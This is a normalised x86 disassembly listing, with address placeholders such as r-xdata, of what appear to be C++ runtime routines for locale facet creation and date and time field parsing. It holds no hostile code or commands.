push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10042ee1
or [ esi ] eax
add esp 0x18
dec [ ebx + 0x10 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1003bed4
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003bc51
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003bc51
cmp ax [ ebp - 0x18 ]
jne r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10041452
jmp r-xdata
lea eax [ ebx + 0xc ]
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10042ee1
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003bc51
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1003bed4
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003bc51
movzx ecx [ ebp - 0x8 ]
movzx eax ax
add ecx 0x9
cmp ecx eax
jl r-xdata
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003b9f8
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1003bed4
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003bc51
cmp ax [ ebp - 0x10 ]
je r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10042e7f
cmp [ ebp - 0x4 ] 0x4
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jne r-xdata
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003bc51
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003bad8
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003b9f8
lea ecx [ ebp + 0xc ]
call sub_1003bc51
cmp ax [ ebp - 0x14 ]
je r-xdata
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
lea eax [ ebx + 0x10 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10042ee1
or [ esi ] eax
add esp 0x18
dec [ ebx + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
or [ esi ] 0x2
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003bc51
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003bc51
cmp ax [ ebp - 0x18 ]
jne r-xdata
lea eax [ ebx + 0xc ]
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10042ee1
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003bad8
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003bc51
movzx ecx [ ebp - 0x8 ]
movzx eax ax
add ecx 0x9
cmp ecx eax
jl r-xdata
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
or [ esi ] 0x1
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10042e7f
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10042ee1
or [ esi ] eax
add esp 0x18
dec [ ebx ]
jmp r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10041452
jmp r-xdata
add ebx 0xc
push ebx
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10042ee1
add esp 0x18
or [ esi ] eax
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
sub_1004356c
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x7f3
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_10042ee1
mov ecx [ ebp + 0x20 ]
or [ ecx ] eax
mov eax [ ecx ]
add esp 0x18
test al 0x2
jne r-xdata
test [ ecx ] 0x2
jne r-xdata
mov edx 0x76c
cmp [ ebp - 0x4 ] edx
jl r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x20
mov eax [ ebp + 0x24 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x14 ] ecx
cmp [ ebp - 0x4 ] 0x87
jle r-xdata
sub [ ebp - 0x4 ] edx
jmp r-xdata
or eax 0x2
mov [ ecx ] eax
sub_100435da
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0x8 ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1003c4ea
add esp 0x10
test eax eax
jge r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x18 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_1004361a
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0xc ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1003c4ea
add esp 0x10
test eax eax
jge r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_1004365a
push 0x98
mov eax sub_1004836c
call sub_10023e33
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp eax edi
je r-xdata
push 0x5
pop eax
call sub_10023f0b
retn
cmp [ eax ] edi
jne r-xdata
push 0x1c
call sub_10020186
pop ecx
mov [ ebp - 0x14 ] eax
push 0x3
mov [ ebp - 0x4 ] edi
pop esi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x30 ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp - 0x14 ]
push edi
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_10042e4c
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
call sub_10007701
test [ ebp - 0x10 ] 0x2
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_100023ce
sub_10043704
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10041c2d
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_100437a1
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004365a
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1004383e
push 0x8
mov eax sub_10048515
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov eax [ ebp + 0xc ]
and eax 0x2
mov [ ebp - 0x10 ] eax
je r-xdata
mov ebx [ ebp + 0xc ]
and ebx 0x8
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_10007802
pop ecx
push eax
push 0x20
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
test [ ebp + 0xc ] 0x1
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_100062b7
pop ecx
push eax
push 0x10
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_10007670
mov esi eax
jmp r-xdata
test [ ebp + 0xc ] 0x20
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1000621a
pop ecx
push eax
push 0x10
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_10006807
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
mov ebx [ ebp + 0xc ]
and ebx 0x4
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1003d811
pop ecx
push eax
push 0x10
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_100067e6
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1003d8ae
pop ecx
push eax
push 0x8
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003ac28
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_100063b6
pop ecx
push eax
push 0x18
call sub_10020186
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0xe
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
cmp ebx edi
je r-xdata
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
mov ebx [ ebp + 0xc ]
and ebx 0x10
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1003d94b
pop ecx
push eax
push 0x10
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor esi esi
mov [ eax + 0x4 ] edi
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_10006828
mov esi eax
jmp r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1003d9e8
pop ecx
push eax
push 0x10
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003ac6c
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_10043704
pop ecx
push eax
push 0x1c
call sub_10020186
pop ecx
mov ecx eax
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] 0x2c
cmp ecx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003ac8f
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
call sub_10023f0b
retn
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1003dbbf
pop ecx
push eax
push 0x14
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
call sub_1004141f
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1003da85
pop ecx
push eax
push 0x34
call sub_10020186
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x20
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
cmp ebx edi
je r-xdata
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1001e730
pop ecx
push eax
push 0x10
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003abc4
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_1003beef
mov esi eax
jmp r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1001daa0
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1003db22
pop ecx
push eax
push 0x34
call sub_10020186
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x26
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
cmp ebx edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_1003bf3b
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
sub_10043ccf
push 0x8
mov eax sub_10048515
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov eax [ ebp + 0xc ]
and eax 0x2
mov [ ebp - 0x10 ] eax
je r-xdata
mov ebx [ ebp + 0xc ]
and ebx 0x8
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1003d774
pop ecx
push eax
push 0x20
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
test [ ebp + 0xc ] 0x1
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1003dc5c
pop ecx
push eax
push 0x10
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003a8d4
mov esi eax
jmp r-xdata
test [ ebp + 0xc ] 0x20
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1003dcf9
pop ecx
push eax
push 0x10
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003ace0
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
mov ebx [ ebp + 0xc ]
and ebx 0x4
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1003de33
pop ecx
push eax
push 0x10
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003adc0
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1003ded0
pop ecx
push eax
push 0x8
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003ae93
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1003dd96
pop ecx
push eax
push 0x18
call sub_10020186
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0xe
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
cmp ebx edi
je r-xdata
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
mov ebx [ ebp + 0xc ]
and ebx 0x10
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1003df6d
pop ecx
push eax
push 0x10
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor esi esi
mov [ eax + 0x4 ] edi
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_1003bb17
mov esi eax
jmp r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1003e00a
pop ecx
push eax
push 0x10
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003b023
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_100437a1
pop ecx
push eax
push 0x1c
call sub_10020186
pop ecx
mov ecx eax
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] 0x2c
cmp ecx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003b0b4
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
call sub_10023f0b
retn
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1003e1e1
pop ecx
push eax
push 0x14
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
call sub_10042e4c
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1003e0a7
pop ecx
push eax
push 0x34
call sub_10020186
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x20
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
cmp ebx edi
je r-xdata
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1003e27e
pop ecx
push eax
push 0x10
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003b1a6
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_1003bf87
mov esi eax
jmp r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1003a619
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1003e144
pop ecx
push eax
push 0x34
call sub_10020186
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x26
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
cmp ebx edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_1003bfd3
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
sub_10044160
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_1003a3bb
mov ecx [ eax ]
mov [ esi + 0x8 ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0xc ] eax
pop esi
leave
retn 0x4
sub_10044186
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_10044160
mov eax esi
pop esi
pop ebp
retn 0x8
sub_100441a9
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10046d1b
add esp 0x14
pop ebp
retn 0x10
sub_100441ca
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp ecx [ ebp + 0xc ]
jne r-xdata
movsx edx [ ecx ]
rol eax 0x8
add eax edx
inc ecx
pop ebp
retn 0x8
sub_100441eb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003a55b
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1004420e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003a55b
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1004424d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
and [ esi + 0x8 ] 0x0
call sub_1003a4ff
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10044290
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10044274
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_100442b1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10044231
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_100442d2
mov edi edi
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
lea ecx [ ebp + 0x14 ]
call sub_10006a85
movzx eax [ eax ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10037ec1
dec [ ebp + 0x1c ]
lea ecx [ ebp + 0x14 ]
call sub_10006abc
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
sub_1004430e
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x14 ]
lea ecx [ ebp + 0xc ]
call sub_10037ec1
dec [ ebp + 0x18 ]
jne r-xdata
sub_10044339
push 0x10
mov eax sub_10048530
call sub_10023e66
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ecx [ ebp + 0x8 ]
